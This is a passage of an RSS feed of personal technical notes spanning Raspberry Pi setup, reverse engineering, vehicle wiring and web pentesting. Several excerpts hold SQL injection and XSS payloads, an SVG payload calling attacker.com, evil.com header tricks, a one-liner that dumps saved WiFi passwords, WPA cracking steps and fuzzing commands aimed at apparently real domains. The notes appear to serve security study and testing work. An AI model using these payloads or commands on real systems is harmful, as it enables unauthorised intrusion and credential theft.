Wait a bit more, close all unused apps, especially (Chrome) tabs Open Activity Monitor and check Hopper Disassembler process details If nothing works, use the command below to purge all unused virtual memory $ purge # =&amp;gt; .</description></item><item><title>Raspberry Pi Quick Guide</title><link>https://duraki.github.io/notes/raspberry-pi-quick-guide/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/raspberry-pi-quick-guide/</guid><description>Installation Use NOOBS or Raspberry Pi official image for hardware environment (ie. PCBs, Electrical Engineering, Breadboard Wiring, Prototypes et al.) Use SD Card Formatter to quickly partition-overwrite whole SD Card Disk Use balenaEtcher to quickly write arm_os of your choice Use Raspberry Pi Imager to quickly write Raspbian OS with custom configuration Configuration Upon installing your favorite *.img on your SD Card, make sure to boot the Raspberry Pi at least once, to finish configuration wizard with-in Raspbian OS.</description></item><item><title>RE</title><link>https://duraki.github.io/notes/re/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/re/</guid><description> Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts Encryption/Cryptography MacOS Reverse Engineering Ghidra and Related LLDB for MacOS Hopper for MacOS iOS Reverse Engineering Frida &amp;amp; Objection Tutorial Pure Reverse Engineering LLDB Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis Android Reverse Engineering Frida &amp;amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation</description></item><item><title>Reverse Engineering Tricks and Tips</title><link>https://duraki.github.io/notes/reverse-engineering-tricks-and-tips/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/reverse-engineering-tricks-and-tips/</guid><description>Find threads by patching a jump with a short jump (EB FE) to create an endless loop you can then search for Looking for &amp;ldquo;CO A8&amp;rdquo; to find local IP addr prefix (192.168) Looking for 4-byte Unix timestamps in hex in a file format or a network packet Search/google all application constant values, classes and libraries Resize Hex Editor window to identify unknown structures and its sizes Check application Log messages and Xref them Replace all https calls with http (instead of hooking on each TLS thread and decrypting SSL) Using LD_PRELOAD to disable specific functions or patching binaries on the fly Use Burp + mitm_relay to proxy traffic Decompile JAR and attack via Frida, Byteman or any other dynamic instrumentation toolkit Use dotPeek to identify and process attack surface for anything .</description></item><item><title>SBC and Alternatives</title><link>https://duraki.github.io/notes/sbc-and-alternatives/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/sbc-and-alternatives/</guid><description>This document explains common use during the operation of SBC (Single-board Computers), such is Raspberry Pi, Banana Pi and others.
Detail instruction for SBC(s) below:
Raspberry Pi Installation and Configuration Banana Pro Installation and Configuration Check How to mount SD Cards notes for instruction on how to mount /boot and ext4 partitions directly from the Host OS. Some ext4 partition mounting explained in MacOS Notes.
Detailed instructions for Enabling SSH on Raspbian OS are also available.</description></item><item><title>Server Anywhere</title><link>https://duraki.github.io/notes/server-anywhere/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/server-anywhere/</guid><description>Each of these commands will run an ad hoc http static server in your current (or specified) directory, available at http://localhost:8000. Use this power wisely.
Discussion on reddit.
Python 2.x $ python -m SimpleHTTPServer 8000 Python 3.x $ python -m http.server 8000 Twisted (Python) $ twistd -n web -p 8000 --path . Or:
$ python -c &amp;#39;from twisted.web.server import Site; from twisted.web.static import File; from twisted.internet import reactor; reactor.listenTCP(8000, Site(File(&amp;#34;.&amp;#34;))); reactor.</description></item><item><title>Signals Table</title><link>https://duraki.github.io/notes/signals-table/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/signals-table/</guid><description>Table Symbol Type Cycle Desc. Function SQR A High / Low Waveform Repeated Rapidly B- D ON / OFF ON/OFF input Low Signal B+ D ON / OFF ON/OFF input High Signal V+ Voltage Positive Voltage Positive GND Ground Voltage Negative &amp;gt; (where &amp;#34;SQR&amp;#34; - Square-Wave Signal) &amp;gt; (where &amp;#34;A&amp;#34; - Analog, &amp;#34;D&amp;#34; - Digital) Documentation SQR Signal Documentation B- Documentation B+ Documentation Bench Test Tricks and Tips You can easily send required signal for B/type Switches, just by checking the Signal Type of the specific Pin.</description></item><item><title>SQLi Payloads</title><link>https://duraki.github.io/notes/sqli-payloads/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/sqli-payloads/</guid><description>More examples might be avilable on netspi
Classical Sleep:
0&amp;#39;XOR(if(now()=sysdate(),sleep(15),0))XOR&amp;#39;Z =&amp;gt; 20.002 0&amp;#39;XOR(if(now()=sysdate(),sleep(6),0))XOR&amp;#39;Z =&amp;gt; 7.282 0&amp;#39;XOR(if(now()=sysdate(),sleep(0),0))XOR&amp;#39;Z =&amp;gt; 0.912 0&amp;#39;XOR(if(now()=sysdate(),sleep(15),0))XOR&amp;#39;Z =&amp;gt; 16.553 0&amp;#39;XOR(if(now()=sysdate(),sleep(3),0))XOR&amp;#39;Z =&amp;gt; 3.463 0&amp;#39;XOR(if(now()=sysdate(),sleep(0),0))XOR&amp;#39;Z =&amp;gt; 1.229 0&amp;#39;XOR(if(now()=sysdate(),sleep(6),0))XOR&amp;#39;Z =&amp;gt; 7.79 /api/tweets?city_id=(select(0)from(select(sleep(25)))v) ’) AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 4376 UNION SELECT 4107) END))--+ type=sharesCountTw&amp;amp;url=http%3a%2f%2finsideok.ru%2flica&amp;amp;count=-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(25))A)) SQL in useragent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36&amp;#39;;WAITFOR DELAY ‘00:00:05’;-- Blind SQL Injection:
# sleep on mysql 4.</description></item><item><title>SVG Payloads</title><link>https://duraki.github.io/notes/svg-payloads/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/svg-payloads/</guid><description>&amp;lt;rect fill=�url(//attacker.com/malicious.svg#exploit)�&amp;gt; (@see: https://hackerone.com/reports/347139)</description></item><item><title>Switched B- (Low) Signals</title><link>https://duraki.github.io/notes/switched-b-low-signals/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/switched-b-low-signals/</guid><description>Akin to B+ Signal, this Ground Signal produces an ON/OFF type input to the Control Module. The voltage level will indicate a specific operating condition.
The only diference between a switched B- and switched B+ is the voltage, in which the signals are switched.
This type of signal can be seen in BMW&amp;rsquo;s Pinout diagrams, symboled by the B-.
.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper .</description></item><item><title>Switched B+ (High) Signals</title><link>https://duraki.github.io/notes/switched-b-high-signals/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/switched-b-high-signals/</guid><description>This DC (Digital) Type Signal produces an ON/OFF type input to the Control Module. The voltage level will indicate a specific operating condition.
This type of signal can be seen in BMW&amp;rsquo;s Pinout diagrams, symboled by the B+.
.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; } B&amp;#43; Signal - Example of ON/OFF Circuit Typical Application of Switched B+ Ignition Switch Light Switch Reed Switch Seat Belt Switch Hall Effect Switch (e.</description></item><item><title>Troubleshoot</title><link>https://duraki.github.io/notes/troubleshoot/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/troubleshoot/</guid><description>Hardware Fix Kappa Headphones on Apple Macbook
MacOS In case you get error, such is stderr: 0:137: execution error: dd: /dev/rdisk4: Operation not permitted, during the Raspberry Pi installation, or mounting of SD Cards, do the following:
If the command reports dd: /dev/rdiskN: Operation not permitted, go to System Preferences -&amp;gt; Security &amp;amp; Privacy -&amp;gt; Privacy -&amp;gt; Files and Folders -&amp;gt; Give Removable Volumes access to Terminal.
Linux Fix RHEL SD Card Reader (Red Hat Enterprise Linux)</description></item><item><title>Upgrade+Wishlist</title><link>https://duraki.github.io/notes/upgrade-wishlist/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/upgrade-wishlist/</guid><description>Upgrade: Dash Camera Preferably front and back, tho would appreciated frontal only. Current choice: XIAOMI 70mai Pro Plus A500 - ~80 EUR, XIAOMI Mi 70mai D01 ~50 EUR, XIAOMI Mi 70mai Pro D02 ~80 EUR
Upgrade: DME/ECU Chip Tuning E34 Chip Tuning - Legit Provider Wtterauer Tuning Gmbh
- Series Stage 1 Displacement 1991 Performance 110 kW / 150 PS 122 kW / 166 PS +11% ~5500 U/min ~5550 U/min Acceleration &amp;mdash; ~0.</description></item><item><title>Vehicle Graybox Security Testing</title><link>https://duraki.github.io/notes/vehicle-graybox-security-testing/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/vehicle-graybox-security-testing/</guid><description>Security Testing Methods Brute-force CAN fuzzer for fuzzing application software Interface scanner, layered fuzzing DoS, Replay Messages, Tampering Man in the Middle Read and write into flash dump (extract keys, certificates, sensitive data) Security Testing in Practice Send out particular frame IDs using IG Generator Mount network-based attacks like DoS, MiTM, Tampering of Signals Access to debug ports like JTAG to extract + corrupt flash memory/firmware Flash dump - Look into sensitive data Approach Reconnaissance Start with market requirements Use customer-provided documents of the system, brochures, user manuals, published material and attacks and vulnerabilities of used components Understand the Architecture Analyze high-level architecture and interfaces to understand interaction between different components Use architecture model, system context, interface model, attack pathway, sequence diagram Identify valued and protectable assets Identify relevant assets, such is hardware, software, database, etc.</description></item><item><title>Vehicle Hacking Environment</title><link>https://duraki.github.io/notes/vehicle-hacking-environment/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/vehicle-hacking-environment/</guid><description>Using Docker and Kali Install Docker first:
$ brew install docker # =&amp;gt; or use docker.io Use the following script:
# ... install required kali-docker tools # setup vehicle hacking environment $ apt-get install -y build-essential $ apt-get install -y ruby $ apt-get install -y ruby-dev $ apt-get install -y rubygems $ gem install serialport -- --use-system-libraries $ apt-get -y install bluez # (for hcitool) $ apt-get install -y net-tools Using Virtual Vehicle environments jeep has been developed to offer offensive-security solution for penetration testing on vehicle systems and similar attributes.</description></item><item><title>vhost Enumeration</title><link>https://duraki.github.io/notes/vhost-enumeration/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/vhost-enumeration/</guid><description>vhost discovery via ffuf:
# =&amp;gt; first, find the total char lenght when the vhost does not exists $ curl -s -H &amp;#34;Host: thisdoesntexists.target.ba&amp;#34; http://target.ba | wc -c 246 # =&amp;gt; now use ffuf + filtering options to find valid vhosts $ ffuf -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H &amp;#34;Host: FUZZ.target.ba&amp;#34; -u http://target.ba -fs 246 # -fc 404,403 vhost discovery via Ruby:
$ git clone https://github.com/jobertabma/virtual-host-discovery.git $ cd virtual-host-discovery $ ruby scan.rb --ip=51.77.138.18 --host=target.</description></item><item><title>Web Application Penetration Test Checklist</title><link>https://duraki.github.io/notes/web-application-penetration-test-checklist/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/web-application-penetration-test-checklist/</guid><description>[+] Sql Injection Attack [+] Hibernate Query Language Injection [+] Direct OS Code Injection [+] XML Entity Injection [+] Broken Authentication and Session Management [+] Cross-Site Scripting (XSS) [+] Insecure Direct Object References [+] Security Misconfiguration [+] Sensitive Data Exposure [+] Missing Function Level Access Control [+] Cross-Site Request Forgery (CSRF) [+] Using Components with Known Vulnerabilities [+] Unvalidated Redirects and Forwards [+] Cross Site Scripting Attacks [+] Click Jacking Attacks [+] DNS Cache Poisoning [+] Symlinking – An Insider Attack [+] Cross Site Request Forgery Attacks [+] Remote Code Execution Attacks [+] Remote File inclusion [+] Local file inclusion [+] EverCookie [+] Denial oF Service Attack [+] Cookie Eviction [+] PHPwn [+] NAT Pinning [+] XSHM [+] MitM DNS Rebinding SSL/TLS Wildcards and [+] Quick Proxy Detection [+] Improving HTTPS Side Channel Attacks [+] Side Channel Attacks in SSL [+] Turning XSS into Clickjacking [+] Bypassing CSRF protections with ClickJacking [+] HTTP Parameter Pollution [+] URL Hijacking [+] Stroke Jacking [+] Fooling B64_Encode(Payload) on WAFs And Filters [+] MySQL Stacked Queries with SQL Injection.</description></item><item><title>Web Fuzzing Techniques</title><link>https://duraki.github.io/notes/web-fuzzing-techniques/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/web-fuzzing-techniques/</guid><description>Use SecList seed fuzz Use FuzzDB seed fuzz Note: You don&amp;rsquo;t have to clone SecList in your $HOME directory. Just create a symlink from your preferable directory (ie. ln -s ~/util/SecLists ~/SecLists).
Using Gobuster || FFuF Gobuster fuzzing:
cat ~/SecLists/Discovery/Web-Content/Common-DB-Backups.txt \ ~/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt \ ~/SecLists/Discovery/Web-Content/PHP.fuzz.txt \ ~/SecLists/Discovery/Web-Content/common.txt | gobuster fuzz -u \ https://www.utic.ba/FUZZ -b 404 -w - -k -t 30 Extending Gobuster with POSIX:
Good trick for extending gobuster is by using POSIX seq command.</description></item><item><title>Web Penetration Testing Oneliners</title><link>https://duraki.github.io/notes/web-penetration-testing-oneliners/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/web-penetration-testing-oneliners/</guid><description>Also See Check if vhost is a live on specific DNS or subdomain:
curl -s -H &amp;#34;Host. $SUBDOMAIN.EXAMPLE.BA&amp;#34; http://example.ba Other techniques described in vhost enumeration
Redirect URI with a Set-Cookie in GET request:
http://$EXAMPLE.BA/index.php?redirect_url=./%3f%0d%0a%09set-cookie:+hello=yoyoo Rate Limit Bypass
Headers: * X-Forwarded-Host: http://evil.com (Password reset poisoning) * X-Forwarded-For: 127.0.0.* (Rate Limit Bypass) Permutations: * Null byte techniques * Case sensitiveness Some other techniques can be used, ie.</description></item><item><title>Wifi Cracking via Aircrack</title><link>https://duraki.github.io/notes/wifi-cracking-via-aircrack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/wifi-cracking-via-aircrack/</guid><description>Deploy Aircrack for cracking WPA2 / WEP in 10 seconds. Written and based on MacOS host.
# =&amp;gt; install macports ... # =&amp;gt; install aircrack-ng $ sudo port install aircrack-ng # =&amp;gt; install latest XCode, with all Command Line Tools ... # =&amp;gt; create the following symlink $ sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport # =&amp;gt; identity channel to sniff $ sudo airport -s # =&amp;gt; in another terminal $ sudo airport en1 sniff [CHANNEL] # =&amp;gt; in another terminal $ aircrack-ng -1 -a 1 -b [TARGET_MAC_ADDRESS] [CAP_FILE] Note that the cap_file will be located in the /tmp/airportSniff*.</description></item><item><title>WinDbg Cheatsheets</title><link>https://duraki.github.io/notes/windbg-cheatsheets/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/windbg-cheatsheets/</guid><description>Just personal things related to my frustration with WinDbg (:
The symbol search path tells WinDbg where to look for symbol (PDB) files. The debugger needs symbol files to obtain information about code modules (function names, variable names, and the like).
.sympath srv* Symbol search path is: srv* Expanded Symbol search path is: cache*;SRV To see the symbols for the Notepad.exe module, enter this command:
x notepad:! Note, if ytou don7t see any output, enter .</description></item><item><title>Windows Notes</title><link>https://duraki.github.io/notes/windows-notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/windows-notes/</guid><description>When setting up Reverse Engineering workstation, use retoolkit for a start kit.
Extract WiFi cleartextr password
cls &amp;amp; echo. &amp;amp; for /f &amp;#34;tokens=4 delims=: &amp;#34; %a in (&amp;#39;netsh wlan show profiles ^| find &amp;#34;Profile &amp;#34;&amp;#39;) do @echo off &amp;gt; nul &amp;amp; (netsh wlan show profiles name=%a key=clear | findstr &amp;#34;SSID Cipher Content&amp;#34; | find /v &amp;#34;Number&amp;#34; &amp;amp; echo.) &amp;amp; @echo on Active Directory
Access Active Directory Domain Admin via Linux:</description></item><item><title>XSS Payloads</title><link>https://duraki.github.io/notes/xss-payloads/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/xss-payloads/</guid><description>JSON: {&amp;#34;email&amp;#34;:&amp;#34;some@email.com&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)//&amp;#34;} The value of REQUEST_URI was not correctly sanitizing user input, in this case, double-quotes. However, due to URL encoding, this was only exploitable in IE. https://inventory.upserve.com/login/?&amp;#39;&amp;#34;--&amp;gt;&amp;lt;script&amp;gt;confirm(document.cookie)&amp;lt;/script&amp;gt; In URL PATH: &amp;#34;accesskey=&amp;#39;x&amp;#39; onclick=&amp;#39;confirm`1`&amp;#39; // Hi&amp;#39;&amp;amp;gt;&amp;#34;&amp;lt;script src=&amp;#34;//xss-server&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;x=&amp;#34;{9*9}\r\n%0a%09%0d&amp;lt;svg\onload=confirm(1)&amp;gt;</description></item></channel></rss>